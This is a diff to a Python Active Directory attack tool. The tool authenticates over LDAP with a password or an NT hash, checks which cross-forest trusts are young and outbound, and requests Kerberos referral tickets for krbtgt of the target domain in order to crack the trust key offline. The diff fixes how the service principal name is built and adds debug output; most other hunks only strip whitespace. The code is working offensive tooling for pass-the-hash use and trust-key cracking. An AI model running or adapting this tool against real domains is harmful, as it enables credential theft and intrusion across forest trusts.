@@ -40,15 +40,15 @@ class TrustValidator:
     def connect(self):
         target = self.dc_ip if self.dc_ip else self.domain
         server = Server(target, get_info=ALL, use_ssl=False)
-        
+
         if self.nthash:
             ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee:{self.nthash}"
-            self.conn = Connection(server, user=f"{self.domain}\\{self.user}", 
+            self.conn = Connection(server, user=f"{self.domain}\\{self.user}",
                                    password=ntlm_hash, authentication=NTLM)
         else:
-            self.conn = Connection(server, user=f"{self.domain}\\{self.user}", 
+            self.conn = Connection(server, user=f"{self.domain}\\{self.user}",
                                    password=self.password, authentication=NTLM)
-        
+
         if not self.conn.bind():
             raise Exception(f"LDAP bind failed: {self.conn.result}")
         return True
@@ -63,26 +63,26 @@ class TrustValidator:
         """
         base_dn = f"CN=System,{self.get_domain_dn()}"
         search_filter = f"(&(objectClass=trustedDomain)(name={target_domain}))"
-        
+
         self.conn.search(
             search_base=base_dn,
             search_filter=search_filter,
             search_scope=SUBTREE,
             attributes=['trustAttributes', 'whenCreated', 'trustDirection', 'name']
         )
-        
+
         if not self.conn.entries:
             return None, None, None, None
-        
+
         entry = self.conn.entries[0]
-        
+
         # Trust Attributes
         trust_attrs = int(entry.trustAttributes.value) if entry.trustAttributes.value else 0
         is_intra_forest = bool(trust_attrs & TRUST_ATTRIBUTE_WITHIN_FOREST)
-        
+
         # Trust Direction (1=Inbound, 2=Outbound, 3=Bidirectional)
         trust_direction = int(entry.trustDirection.value) if entry.trustDirection.value else 0
-        
+
         # When Created
         when_created = entry.whenCreated.value
         if when_created:
@@ -91,7 +91,7 @@ class TrustValidator:
             days_since = (datetime.now(timezone.utc) - when_created.replace(tzinfo=timezone.utc)).days
         else:
             days_since = None
-        
+
         return True, is_intra_forest, days_since, trust_direction
 
     def close(self):
@@ -175,7 +175,9 @@ class TrustKeyCracker:
         req_body['kdc-options'] = constants.encodeFlags(opts)
         req_body['realm'] = self.domain
 
-        spn_principal = Principal(target_spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
+        # SPN을 컴포넌트로 분리 (수정된 부분)
+        spn_parts = target_spn.split('/')
+        spn_principal = Principal(spn_parts, type=constants.PrincipalNameType.NT_SRV_INST.value)
         seq_set(req_body, 'sname', spn_principal.components_to_asn1)
 
         req_body['till'] = KerberosTime.to_asn1(datetime(2037, 12, 31, 23, 59, 59))
@@ -354,35 +356,35 @@ def main():
         if not LDAP_AVAILABLE:
             print("[!] ldap3 not installed. Use -no-check to skip or: pip install ldap3")
             sys.exit(1)
-        
+
         validator = TrustValidator(domain, user, password=password, nthash=nthash, dc_ip=args.dc_ip)
         try:
             validator.connect()
             exists, is_intra, days, direction = validator.check_trust(args.target_domain)
             validator.close()
-            
+
             if not exists:
                 print(f"[!] No trust relationship with {args.target_domain}")
                 sys.exit(1)
-            
+
             if is_intra:
                 print(f"[!] {args.target_domain} is in the same forest - intra-forest trust keys cannot be cracked offline")
                 sys.exit(1)
-            
+
             if days is not None and days > 30:
                 print(f"[!] Trust created {days} days ago - password was auto-rotated by DC, cannot crack")
                 sys.exit(1)
-            
+
             # Direction check (need outbound or bidirectional)
             if direction == 1:  # Inbound only
                 print(f"[!] Trust is inbound-only - no referral ticket available from this domain")
                 sys.exit(1)
-            
+
             if days is not None:
                 print(f"[*] Cross-forest trust to {args.target_domain} (created {days} days ago)")
             else:
                 print(f"[*] Cross-forest trust to {args.target_domain}")
-                
+
         except Exception as e:
             print(f"[!] LDAP trust check failed: {e}")
             print("[*] Continuing without validation (use -no-check to suppress)")
@@ -413,7 +415,7 @@ def main():
         sys.exit(1)
 
     target_spn = f"krbtgt/{args.target_domain.upper()}"
-    
+
     try:
         result = cracker.request_referral(target_spn)
     except Exception as e:
@@ -439,6 +441,8 @@ def main():
             print(f"[!] KRB-ERROR {error_code}: {result['error_msg']}")
         sys.exit(1)
     else:
+        print(f"[DEBUG] result type: {result['type']}")
+        print(f"[DEBUG] result: {result}")
         print(f"[!] Unexpected response from KDC")
         sys.exit(1)
 
